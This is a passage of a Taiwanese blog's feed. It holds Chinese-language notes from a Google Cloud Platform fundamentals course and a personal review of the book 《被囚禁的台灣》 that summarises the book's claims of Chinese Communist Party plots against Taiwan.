&lt;li&gt;Create Docker container images from app code in Google Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Container Registry  &lt;ul&gt;
&lt;li&gt;Secure, private Docker image storage  &lt;blockquote&gt;
&lt;p&gt;沒記錯的話 images 是存在 Cloud Storage 上  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.docker.com/"&gt;https://cloud.docker.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 5&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-container-engine/#0"&gt;Deploying Applications Using Google Container Engine&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 6: Google Compute Engine and Networking&lt;/h1&gt;
&lt;h2&gt;Google Compute Engine&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Run large-csale workloads on virtual machines hosted on Google's infrastructure  &lt;/li&gt;
&lt;li&gt;Robust networking features  &lt;ul&gt;
&lt;li&gt;可以拿來做 MySQL cluster load balancer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instance metadata and startup scripts  &lt;ul&gt;
&lt;li&gt;每個 instance 會有 global 的 metadata 和各自的 metadata  &lt;/li&gt;
&lt;li&gt;startup script 也是放在 metadata 去做描述  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Persistent disk snapshots  &lt;/li&gt;
&lt;li&gt;High CPU, high memory, standard and shared-core machine types  &lt;/li&gt;
&lt;li&gt;HTTP and network load balancing  &lt;ul&gt;
&lt;li&gt;可以針對 Load Balancer 做個別的設定，會比 AWS 簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Advanced APIs for auto-scaling and group management  &lt;/li&gt;
&lt;li&gt;Innovative pricing  &lt;ul&gt;
&lt;li&gt;per &lt;em&gt;minute&lt;/em&gt; billing, sustained use discounts  &lt;/li&gt;
&lt;li&gt;Preemptible instances  &lt;/li&gt;
&lt;li&gt;High throughput to storage at no extra cost  &lt;/li&gt;
&lt;li&gt;Custom machine types - Only pay for the hardware you need  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Google 用 KVM 來實作這部份  &lt;/li&gt;
&lt;li&gt;可以在兩分多鐘內就開啟 1000 台機器  &lt;ul&gt;
&lt;li&gt;壓力測試跑了大概一個多小時，最後收到帳單大概是 500 美金左右。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;硬碟必須至少要 200 GB 才會有一般的 performance, &amp;lt; 200 GB 的話會比較慢。  &lt;/li&gt;
&lt;li&gt;目前看到比較多的是拿來當 Load Balancer  &lt;/li&gt;
&lt;li&gt;目前 Load Balancer 使用 BSD 是會有問題的，因為缺少某些 Linux 才有的 Libraries。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Networking&lt;/h2&gt;
&lt;h3&gt;Google Cloud Interconnect&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Carrier Interconnect  &lt;/li&gt;
&lt;li&gt;Direct Peering  &lt;ul&gt;
&lt;li&gt;需要有第 2 類電信執照才能申請  &lt;/li&gt;
&lt;li&gt;Connect your business directly to Google  &lt;/li&gt;
&lt;li&gt;所有流量的費用打對折，速度會更快，適合擁有 Data Center 的公司申請。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud VPN&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Secure connection over the Internet  &lt;/li&gt;
&lt;li&gt;Securely connect your network to Google Cloud Platform using IPsec VPN connection  &lt;/li&gt;
&lt;li&gt;Encrypts traffic over the Internet  &lt;/li&gt;
&lt;li&gt;Google Cloud Router supports dynamic routing between Google Cloud Platform and your network  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud DNS&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Highly available and scalable DNS  &lt;/li&gt;
&lt;li&gt;Translates domain names into IP addresses  &lt;/li&gt;
&lt;li&gt;Create managed zones, then add, edit, delete DNS records  &lt;/li&gt;
&lt;li&gt;Programmatically manage zones and records using RESTful API or command- line interface  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Load Balancing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;HTTP(s) load balancing  &lt;/li&gt;
&lt;li&gt;Balance HTTP-based traffic across multiple Compute Engine regions  &lt;/li&gt;
&lt;li&gt;Global, external IP address routes traffic  &lt;/li&gt;
&lt;li&gt;Scalable, requires no pre-warming and provides resilience, fault tolerance  &lt;/li&gt;
&lt;li&gt;TCP/SSL and UDP (network) load balancing  &lt;ul&gt;
&lt;li&gt;Spread TCP/SSL and UDP traffic over pool of instances within a Compute Engine region  &lt;/li&gt;
&lt;li&gt;Ensures only healthy instances handle traffic  &lt;/li&gt;
&lt;li&gt;Scalable, requires no pre-warming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Global  &lt;ul&gt;
&lt;li&gt;可以在不同的 region 建 load balancer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP(S) load balancing  &lt;/li&gt;
&lt;li&gt;Network load balancing  &lt;ul&gt;
&lt;li&gt;支援 Auto scaling  &lt;/li&gt;
&lt;li&gt;可以設定 protocol 跟 port  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以選擇 client IP + Protocol 的規則，看要導到哪台 Load Balancer  &lt;/li&gt;
&lt;li&gt;有隱藏 CDN 的功能，可以把 CDN 的功能打開。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Operations and Tools&lt;/h2&gt;
&lt;h3&gt;Google Stackdriver&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Integrated monitoring, logging, diagnostics  &lt;/li&gt;
&lt;li&gt;Works across Google Cloud Platform, Amazon Web Services  &lt;/li&gt;
&lt;li&gt;Open source agents, integration  &lt;/li&gt;
&lt;li&gt;Powerful data, analytics tools  &lt;/li&gt;
&lt;li&gt;Collaborations with PagerDuty, BMC, Splunk, others  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以針對條件去設定 alert  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Cloud Monitoring&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;可以監控各種項目  &lt;/li&gt;
&lt;li&gt;可以自訂要監控哪些部份  &lt;/li&gt;
&lt;li&gt;可以和第三方應用程式銜接  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Cloud Logging&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;可以幫你很輕鬆的檢視不同機器的 log  &lt;/li&gt;
&lt;li&gt;Log 線上保留三十天  &lt;/li&gt;
&lt;li&gt;支援 Export，讓你可以自己處理 Log  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Deployment Manager&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Infrastructure management service  &lt;/li&gt;
&lt;li&gt;Create a .yaml template describing your environment and use Deployment Manager to create resources  &lt;/li&gt;
&lt;li&gt;Provides repeatable deployments  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;有點類似 Ansible 和 Chef  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Source Repositories&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-featured Git repositories hosted on Google Cloud Platform  &lt;/li&gt;
&lt;li&gt;Supports collaborative development of cloud apps  &lt;/li&gt;
&lt;li&gt;Includes:  &lt;ul&gt;
&lt;li&gt;Source code editor  &lt;/li&gt;
&lt;li&gt;Integration with Stackdriver debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Functions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Create single-purpose functions that respond to events without a server or runtime  &lt;ul&gt;
&lt;li&gt;Event examples: New instance created, file added to Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Written in Javascript, execute in managed Node.js environment on Google Cloud Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 6&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-compute-engine/#0"&gt;Deploying Applications Using Google Compute Engine&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 7: Big Data and Machine Learning&lt;/h1&gt;
&lt;p&gt;&lt;img alt="Big Data Services" src="/files/cp100a-google-cloud-platform-fundamentals/big-data-services.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fully managed, No-Ops Services  &lt;/li&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;一個 column 就儲存一個 object，不是存 row。(column based)  &lt;ul&gt;
&lt;li&gt;不要下 &lt;code&gt;select *&lt;/code&gt;，會很慢，而且很貴，因為會對 process 的資料量收費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;每次 query 就透過 mapreduce 去做 macthing  &lt;/li&gt;
&lt;li&gt;可以透過 SQL-like 的語法(GQL)去查詢 big data  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://drill.apache.org/"&gt;Apache drill&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pub/Sub  &lt;ul&gt;
&lt;li&gt;建立一個 big data 用的 queue  &lt;/li&gt;
&lt;li&gt;比較常用的案例是 IoT  &lt;/li&gt;
&lt;li&gt;可搭配 dataflow 作 big data 的運算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataflow  &lt;ul&gt;
&lt;li&gt;幫你整理資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataproc  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Big Data&lt;/h2&gt;
&lt;h3&gt;Google BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed analytics data warehouse  &lt;ul&gt;
&lt;li&gt;provides a service for near real-time interactive analysis of massive datasets (hundreds of TBs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Query using a SQL-like syntax (GQL)  &lt;/li&gt;
&lt;li&gt;Only pay for storage, processing used  &lt;/li&gt;
&lt;li&gt;Zero administration for performance and scale  &lt;/li&gt;
&lt;li&gt;Supports open standads  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;當作 storage 和 analyze 的工具  &lt;/li&gt;
&lt;li&gt;類似 &lt;a href="https://cassandra.apache.org/"&gt;Cassandra&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Column-based  &lt;/li&gt;
&lt;li&gt;1 TB 的資料大概花 6 秒就可以 scan 完  &lt;/li&gt;
&lt;li&gt;一次會幫你開很多機器去做運算，最後吐回一個結果給你  &lt;/li&gt;
&lt;li&gt;切忌用 &lt;code&gt;select *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;有 dry run 可以先告訴你這個 Query 下下去會花多少錢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Pub/Sub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Scalable and reliable messaging for Google Cloud Platform and beyond  &lt;/li&gt;
&lt;li&gt;Supports many-to-many asynchronous messaging  &lt;/li&gt;
&lt;li&gt;Includes support for offline consumers  &lt;/li&gt;
&lt;li&gt;Based on proven Google technologies  &lt;/li&gt;
&lt;li&gt;Integrates with Cloud Dataflow for data processing pipelines  &lt;/li&gt;
&lt;li&gt;Uses push/pull subscriptions to topics  &lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;Building block for data ingestion in Dataflow, Internet of Things (IoT), Marketing Analytics  &lt;/li&gt;
&lt;li&gt;Foundation for Dataflow streaming  &lt;/li&gt;
&lt;li&gt;Push notifications for cloud-based applications  &lt;/li&gt;
&lt;li&gt;Connect applications across Google Cloud Platform (push/pull between Compute Engine and App Engine)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataflow&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed service for executing scalable and reliable data pipelines  &lt;/li&gt;
&lt;li&gt;Write code once and get batch and streaming  &lt;ul&gt;
&lt;li&gt;Transform-based programming model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clusters are sized for you  &lt;/li&gt;
&lt;li&gt;Processes data using Compute Engine instances  &lt;/li&gt;
&lt;li&gt;Integrates with GCP services like Cloud  Storage, Cloud Pub/Sub, BigQuery, Bigtable  &lt;/li&gt;
&lt;li&gt;Open source Java and Python SDKs  &lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;ETL (extract/transform/load) pipelines to move, filter, enrich, shape data  &lt;/li&gt;
&lt;li&gt;Data analysis - batch computation or continuous computation using streaming  &lt;/li&gt;
&lt;li&gt;Orchestration - create pipelines that coordinate services, including external services  &lt;ul&gt;
&lt;li&gt;可以很容易的和其他服務整合  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Dataproc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Fast, easy, managed way to run Hadoop and Spark/Hive/Pig on Google Cloud Platform  &lt;/li&gt;
&lt;li&gt;Benefit from cloud integration  &lt;ul&gt;
&lt;li&gt;Cloud Storage  &lt;/li&gt;
&lt;li&gt;Stackdriver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Customize and configure clusters using initialization actions  &lt;/li&gt;
&lt;li&gt;Create clusters in 90 sec or less  &lt;/li&gt;
&lt;li&gt;Dataproc clusters billed minute-by-minute  &lt;ul&gt;
&lt;li&gt;Save money using preemptible instances for batch processing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scale clusters up and down even when jobs are running  &lt;/li&gt;
&lt;li&gt;Developer tools  &lt;ul&gt;
&lt;li&gt;RESTful API  &lt;/li&gt;
&lt;li&gt;Integration with Google Cloud SDK  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use cases:  &lt;ul&gt;
&lt;li&gt;Easily migrate on-premises Hadoop jobs to the cloud  &lt;/li&gt;
&lt;li&gt;Quickly analyze data (like log data) stored in Cloud Storage - create a cluster in less than 2 minutes then delete it immediately  &lt;/li&gt;
&lt;li&gt;Use Spark/Spark SQL to quickly to perform data mining and analysis  &lt;ul&gt;
&lt;li&gt;Spark SQL 可以讓你比較好操控資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use Spark Machine Learning Libraries (MLlib) to run classification algorithms  &lt;ul&gt;
&lt;li&gt;Spark 最強的部份就是 MLlib，但之後可能會被 Google 推出的 TensorFlow API 取代掉也不一定  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;Cluster  &lt;/li&gt;
&lt;li&gt;HDFS work node  &lt;/li&gt;
&lt;li&gt;完整的 Hadoop 類型服務  &lt;/li&gt;
&lt;li&gt;可以在 WebUI 上面選擇 node 數目  &lt;/li&gt;
&lt;li&gt;要自己寫 mapreduce  &lt;/li&gt;
&lt;li&gt;支援直接撈 Cloud Storage 的資料，甚至可以把資料送到 BigQuery  &lt;/li&gt;
&lt;li&gt;create cluster 後要 submit job，只要寫好 mapreduce 和 jar 檔，就可以直接幫你處理資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://datalab.cloud.google.com/"&gt;Google Cloud Datalab&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Interactive tool for large-scale data exploration, transformation, analysis, visualization  &lt;/li&gt;
&lt;li&gt;Analyze data in BigQuery, Compute Engine, and Cloud Storage using Python, SQL, and JavaScript  &lt;/li&gt;
&lt;li&gt;Easily deploy transformation, analysis models to BigQuery  &lt;/li&gt;
&lt;li&gt;Integrated, open source  &lt;ul&gt;
&lt;li&gt;Runs on Google App Engine  &lt;/li&gt;
&lt;li&gt;Built on Jupyter (formerly IPython)  &lt;/li&gt;
&lt;li&gt;Use Google Charts or matplotlib for easy visualizations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Code, documentation, results, visualizations in intuitive notebook format  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以透過 Google 去銜接很多 Datasource，可以做整合，例如匯出報表。  &lt;/li&gt;
&lt;li&gt;有支援 BigQuery, Cloud Dataflow，可以利用他們去做分析  &lt;/li&gt;
&lt;li&gt;用法跟 Jupyter Notebook 差不多  &lt;/li&gt;
&lt;li&gt;是使用 Managed VM 來用 Datalab，該 VM 會裝一些套件，然後透過 GAE 去操作。  &lt;ul&gt;
&lt;li&gt;安裝好後會變成 GAE 裡頭的其中一個 service  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Machine Learning (Google Cloud ML)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/vision/"&gt;Vision API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/speech/"&gt;Speech API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/translate/docs/"&gt;Translate API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/prediction/"&gt;Prediction API&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Google Cloud Machine Learning Use Cases  &lt;ul&gt;
&lt;li&gt;Structured Data  &lt;ul&gt;
&lt;li&gt;Classification / Regression  &lt;ul&gt;
&lt;li&gt;Customer churn analysis  &lt;/li&gt;
&lt;li&gt;Product diagnostics  &lt;/li&gt;
&lt;li&gt;Forecasting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recommendation  &lt;ul&gt;
&lt;li&gt;Content personalization  &lt;/li&gt;
&lt;li&gt;Product X-sells/up-sells  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anomaly Detection  &lt;ul&gt;
&lt;li&gt;Fraud detection  &lt;/li&gt;
&lt;li&gt;Asset sensor diagnostics  &lt;/li&gt;
&lt;li&gt;Log metric anomalies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unstructured Data  &lt;ul&gt;
&lt;li&gt;Image Analytics  &lt;ul&gt;
&lt;li&gt;Identify damaged shipments  &lt;/li&gt;
&lt;li&gt;Explicit content classification  &lt;/li&gt;
&lt;li&gt;Identify “styles” in images  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Text Analytics  &lt;ul&gt;
&lt;li&gt;Call center log analysis  &lt;/li&gt;
&lt;li&gt;Language identification  &lt;/li&gt;
&lt;li&gt;Topic classification  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sentiment analysis  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 7&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-big-query/#0"&gt;Getting Started with BigQuery&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Questions&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;一個帳號可以管理的 Project 上限是多少？  &lt;/li&gt;
&lt;li&gt;GAE serving static 不用開 instance?  &lt;/li&gt;
&lt;li&gt;Project migration 的建議  &lt;/li&gt;
&lt;li&gt;Bigtable 和 BigQuery 的主要差異  &lt;/li&gt;
&lt;li&gt;GKE 的 MySQL cluster  &lt;/li&gt;
&lt;li&gt;GAE 的 Front-end instances 跟 Back-end instances 的差別  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;其實還有很多問題啦，只是沒有太多時間可以問，&lt;br /&gt;
而且要在網路上發問又必須描述的很詳細，&lt;br /&gt;
然後 Facebook 又是個黑洞，很難找之前的發文內容，&lt;br /&gt;
實在不太喜歡拿 Facebook 來問問題。&lt;br /&gt;
所以可能就自己 Google 、親自實驗或之後有機會再在 GCPUG.tw 當面問吧  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;相關連結&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/GCPUG.TW/"&gt;https://www.facebook.com/groups/GCPUG.TW/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;臺灣的 Google Cloud Platform User Group，有問題歡迎在上面發問討論。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/products/calculator/"&gt;Google Cloud Platform Pricing Calculator | Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP Pricing 試算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatformTraining"&gt;https://github.com/GoogleCloudPlatformTraining&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GCP 教材的 Lab code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;有種吃了 GCP 大還丹的感覺，需要時間消化。&lt;br /&gt;
能夠在上班時間來 Google Taipei 上課實在太棒了！&lt;br /&gt;
謝謝同事 Finley 一直被我煩被我問問題 XD&lt;br /&gt;
感謝老闆 Teddy，也感謝辛苦的講師 Simon。  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Google Cloud Platform"></category></entry><entry><title>《被囚禁的台灣》</title><link href="https://blog.m157q.tw/posts/2016/05/15/imprisoned-taiwan/" rel="alternate"></link><published>2016-05-15T23:03:24+08:00</published><updated>2016-05-15T23:03:24+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-05-15:posts/2016/05/15/imprisoned-taiwan/</id><summary type="html">&lt;p&gt;週末因為 g0v summit 的關係到南港中研院，&lt;br /&gt;
第一天結束後約了 Apua 出來吃飯，&lt;br /&gt;
他說他因為批踢踢的文章跑去買了這本書：&lt;br /&gt;
&lt;a href="http://www.books.com.tw/products/0010631486"&gt;博客來-被囚禁的臺灣[新編版]&lt;/a&gt;，&lt;br /&gt;
問我有沒有興趣，就拿來看了。&lt;br /&gt;
我看的那本封面看起來是原版的，不是上面這本新編版。&lt;br /&gt;
&lt;img alt="imprisoned-taiwan" src="/files/imprisoned-taiwan/imprisoned-taiwan.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;老實說整本書很沉重，&lt;br /&gt;
就是在講中共高層如何有計劃地阻止台灣獨立，&lt;br /&gt;
從 2000 年阿扁當選總統，台灣第一次政黨輪替開始，&lt;br /&gt;
中國陸續有許多非外族的地區發生渴望自由民主而傷人的事件，&lt;br /&gt;
也有許多地區有出現要求投票選代表的狀況。&lt;br /&gt;
中共高層非常害怕這樣的情況會擴散，&lt;br /&gt;
而支持獨立建國的阿扁會讓台灣人民的主權意識抬頭，&lt;br /&gt;
造成台灣更進一步成為中國其他地區對於自由民主的示範，&lt;br /&gt;
一旦台獨成功，原本就有的疆獨和藏獨肯定會受到鼓勵。&lt;br /&gt;
所以從 2002 年開始由辛旗主導策劃行動，&lt;br /&gt;
後期則加入了林毅夫主導與經濟有關的部份。&lt;br /&gt;
目的是要讓台灣孤立無援，&lt;br /&gt;
透過媒體的壟斷，&lt;br /&gt;
讓台灣民眾覺得民主就是混亂，&lt;br /&gt;
透過經濟上的孤立，&lt;br /&gt;
讓台灣民眾覺得只要獨立建國就會在國際上無法生存下去，&lt;br /&gt;
再加上透過媒體和親中的商人不斷鼓吹台商前進中國設廠，&lt;br /&gt;
讓整個台灣的經濟必須得仰賴中國而無法脫離。&lt;br /&gt;
而這個精心策劃的和平統戰就叫一個字，「囚」。  &lt;/p&gt;
&lt;p&gt;敘述主軸從從 2000 年阿扁當選總統開始，&lt;br /&gt;
一直到 2012 年馬英九連任。&lt;br /&gt;
尤其以三一九槍擊案、倒扁紅杉軍、誣陷阿扁貪污三件為重點敘述，&lt;br /&gt;
敘述這三件事都是安排好的劇碼，&lt;br /&gt;
目的就是要台灣人對阿扁徹底厭惡，&lt;br /&gt;
讓台灣人對第一次政黨輪替的民主失去信心，&lt;br /&gt;
（就是很常聽到有人講的：「台灣就是太自由才會怎樣怎樣」那種）&lt;br /&gt;
只要台灣人愈覺得民主是件可有可無的事，&lt;br /&gt;
那要統一台灣地區就更加的容易。&lt;br /&gt;
也提到了中共高層如何透過選前三天的三一九槍擊案，&lt;br /&gt;
「故意」讓民進黨連任，&lt;br /&gt;
讓不肯投共、覺得靠國民黨自己就可以打贏選戰的國民黨高層徹底喪失信心，&lt;br /&gt;
一方面也達到了讓台灣民眾覺得選舉就是危險又混亂，進而討厭選舉。  &lt;/p&gt;
&lt;p&gt;真的提到了很多我不知道也沒想過的事情，例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;三一九的槍手有兩個，陳義雄是經過挑選必要時找來替死的煙霧彈。  &lt;/li&gt;
&lt;li&gt;中共「情報系統之王」總參二部的存在  &lt;/li&gt;
&lt;li&gt;李昌鈺是中共安排好的人  &lt;/li&gt;
&lt;li&gt;紅衫軍的許信良早就被中共收買  &lt;/li&gt;
&lt;li&gt;陳雲林要用十億美元為馬英九買一個「諾貝爾和平獎」  &lt;ul&gt;
&lt;li&gt;看到這個就讓我想到馬習會...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中共包養的「經濟二奶」蔡衍明用金錢勒死台灣言論自由的內幕  &lt;ul&gt;
&lt;li&gt;旺旺中時，不用多說了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;薄熙來事件造成的中共政治大危機，以及這次危機阻遏和遲滯胡錦濤在二零一二年政治解決台灣問題的戰略構想的內幕  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中也提到了美國的立場，&lt;br /&gt;
要台灣人民別太相信美國能為台灣做些什麼，&lt;br /&gt;
因為從核心利益來看，&lt;br /&gt;
美國不太可能公開聲明支持台灣獨立。  &lt;/p&gt;
&lt;p&gt;早幾年看我會覺得這本書是陰謀論，&lt;br /&gt;
但看完後我覺得書中的解釋大部分都還挺合理的。&lt;br /&gt;
因為提到的很多事至今仍然沒有下文也沒看見其他合理的解釋。  &lt;/p&gt;
&lt;p&gt;更詳細的內容可以參考這篇報導&lt;br /&gt;
&lt;a href="http://www.epochtimes.com/b5/12/10/1/n3695466.htm"&gt;《被囚禁的台灣》內容簡介 | 袁紅冰 | 大紀元&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;讀完這本書後，&lt;br /&gt;
真的是毛骨悚然，&lt;br /&gt;
因為很多事情真的都是在照著中共的步調走...&lt;br /&gt;
我覺得有必要去閱讀一下袁紅冰另外兩本作品：&lt;br /&gt;
《台灣大劫難》及《台灣自由三部曲》&lt;br /&gt;
（不知道是不是因為 2008 年唸高中以後已經是國民黨執政，所以我完全沒聽過這兩本書）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.epochtimes.com/b5/12/10/1/n3695466.htm"&gt;《被囚禁的台灣》內容簡介 | 袁紅冰 | 大紀元&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=kbe0yER9cAQ"&gt;《被囚禁的台灣》作者袁紅冰專訪：太陽花學運、2017中共逼台簽署統一協議？│老外看中國│郝毅博 Ben Hedges - YouTube&lt;/a&gt;  &lt;/li&gt;
